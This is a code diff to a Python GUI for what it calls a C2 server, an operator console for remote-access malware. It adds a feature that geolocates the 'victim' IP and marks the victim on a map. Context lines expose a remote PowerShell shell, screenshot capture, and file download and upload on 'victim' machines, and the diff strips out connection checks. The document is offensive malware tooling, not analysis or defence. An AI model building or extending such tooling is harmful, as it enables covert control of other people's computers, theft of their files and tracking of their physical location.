@@ -1,7 +1,6 @@
 import tkinter as tk
 from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
 import threading
-import subprocess
 import io
 from pathlib import Path
 from PIL import Image, ImageTk
@@ -9,7 +8,7 @@ import sv_ttk
 
 # Import the wrapper module
 try:
-    from wrapper import C2Wrapper
+    from wrapper import C2Wrapper   
     WRAPPER_LOADED = True
 except ImportError as e:
     print(f"[ERR] Could not import C2Wrapper: {e}")
@@ -98,6 +97,12 @@ class C2ServerGUI:
         # Create grid layout for commands
         commands = [
             {
+                "text": "Location",
+                "desc": "Show victim's geographical location on interactive map",
+                "command": self.show_victim_location,
+                "var_name": "location_btn"
+            },
+            {
                 "text": "Shell",
                 "desc": "Opens terminal window for PowerShell/CMD commands",
                 "command": self.start_powershell,
@@ -161,7 +166,82 @@ class C2ServerGUI:
         self.log_text.tag_config("info", foreground="#4A9EFF")
         self.log_text.tag_config("success", foreground="#50C878")
         self.log_text.tag_config("error", foreground="#FF6B6B")
+
+    def show_victim_location(self):
+        victim_ip = self.c2.ipv4.strip()
+
+        # Create loading window
+        loading_win = tk.Toplevel(self.root)
+        loading_win.title("Locating Victim...")
+        loading_win.geometry("300x100")
+        loading_win.transient(self.root)
+        loading_win.grab_set()
+        ttk.Label(loading_win, text=f"Resolving location for:\n{victim_ip}", font=("Arial", 10)).pack(pady=20)
+        ttk.Progressbar(loading_win, mode='indeterminate').pack(pady=10, fill=tk.X, padx=20)
+        loading_win.update()
         
+        def geolocate_and_show():
+            try:
+                import requests
+                from tkintermapview import TkinterMapView
+
+                url = f"https://ipwhois.app/json/{victim_ip}"
+                response = requests.get(url, timeout=10)
+                data = response.json()
+
+                if not data.get("success", True):
+                    raise Exception(data.get("message", "Unknown error"))
+
+                latitude = data.get("latitude")
+                longitude = data.get("longitude")
+                city = data.get("city", "Unknown City")
+                region = data.get("region", "")
+                country = data.get("country", "Unknown Country")
+                org = data.get("org", "")
+                isp = data.get("isp", "")
+
+
+                if not latitude or not longitude:
+                    raise Exception("Location data not available")
+
+                # Close loading window
+                self.root.after(0, loading_win.destroy)
+
+                # Create map window
+                map_window = tk.Toplevel(self.root)
+                map_window.title(f"Victim Location - {victim_ip}")
+                map_window.geometry("1000x700")
+                map_window.minsize(800, 600)
+
+                # Header info
+                header_frame = ttk.Frame(map_window)
+                header_frame.pack(fill=tk.X, padx=10, pady=10)
+
+                info_text = f"IP: {victim_ip}  |  {city}, {region}, {country}  |  ISP: {org or isp}"
+                ttk.Label(header_frame, text=info_text, font=("Segoe UI", 11, "bold"), foreground="#2c3e50").pack()
+
+                accuracy = "± ~50–100 km (IP-based geolocation)"
+                ttk.Label(header_frame, text=accuracy, font=("Arial", 9), foreground="gray").pack(pady=(2,0))
+
+                # Map widget
+                map_widget = TkinterMapView(map_window, width=980, height=600, corner_radius=10)
+                map_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0,10))
+
+                # Set map type and position
+                map_widget.set_tile_server("https://a.tile.openstreetmap.org/{z}/{x}/{y}.png", max_zoom=22)
+                map_widget.set_position(latitude, longitude)
+                map_widget.set_zoom(13)
+                map_widget.set_marker(latitude, longitude, text=f"Victim Location\n{city}, {country}")
+
+                self.log(f"Geolocation success: {city}, {country} ({latitude}, {longitude})", "success")
+
+            except Exception as e:
+                self.root.after(0, loading_win.destroy)
+                messagebox.showerror("Geolocation Failed", f"Could not determine location:\n\n{str(e)}")
+                self.log(f"Geolocation failed for {victim_ip}: {e}", "error")
+
+        threading.Thread(target=geolocate_and_show, daemon=True).start()
+            
     def log(self, message, level="info"):
         self.log_text.config(state=tk.NORMAL)
         self.log_text.insert(tk.END, message + "\n", level)
@@ -206,6 +286,8 @@ class C2ServerGUI:
         self.screenshot_btn.config(state=tk.NORMAL)
         self.download_btn.config(state=tk.NORMAL)
         self.upload_btn.config(state=tk.NORMAL)
+        self.location_btn.config(state=tk.NORMAL)
+        
         
     def _disable_commands(self):
         """Disable all command buttons"""
@@ -213,16 +295,13 @@ class C2ServerGUI:
         self.screenshot_btn.config(state=tk.DISABLED)
         self.download_btn.config(state=tk.DISABLED)
         self.upload_btn.config(state=tk.DISABLED)
+        self.location_btn.config(state=tk.DISABLED)
+        
         
     def stop_server(self):
-        if self.c2:
-            try:
-                self.c2.cleanup()
-                self.log("Server stopped")
-            except Exception as e:
-                self.log(f"Cleanup error: {e}", "error")
-            finally:
-                self.c2 = None
+        self.c2.cleanup()
+        self.log("Server stopped")
+        self.c2 = None
                 
         self.connected = False
         self.status_label.config(text="Disconnected", foreground="red")
@@ -232,11 +311,6 @@ class C2ServerGUI:
         self._disable_commands()
         
     def start_powershell(self):
-        """Start interactive shell - runs in blocking thread"""
-        if not self.connected or not self.c2:
-            messagebox.showwarning("Warning", "No active connection")
-            return
-
         try:
             def run_shell():
                 try:
@@ -259,11 +333,6 @@ class C2ServerGUI:
             messagebox.showerror("Error", f"Failed to start shell:\n{e}")
             
     def take_screenshot(self):
-        """Take screenshot from victim"""
-        if not self.connected or not self.c2:
-            messagebox.showwarning("Warning", "No active connection")
-            return
-        
         try:
             self.c2.take_screenshot()
             
@@ -357,11 +426,6 @@ class C2ServerGUI:
             self.log(f"Display error: {e}", "error")
             
     def download_file(self):
-        """Download file from victim"""
-        if not self.connected or not self.c2:
-            messagebox.showwarning("Warning", "No active connection")
-            return
-        
         remote_path = simpledialog.askstring(
             "Download File",
             "Enter remote file path on victim machine:\n"
@@ -402,11 +466,6 @@ class C2ServerGUI:
             )
             
     def upload_file(self):
-        """Upload file to victim"""
-        if not self.connected or not self.c2:
-            messagebox.showwarning("Warning", "No active connection")
-            return
-        
         local_path = filedialog.askopenfilename(
             title="Select file to upload"
         )
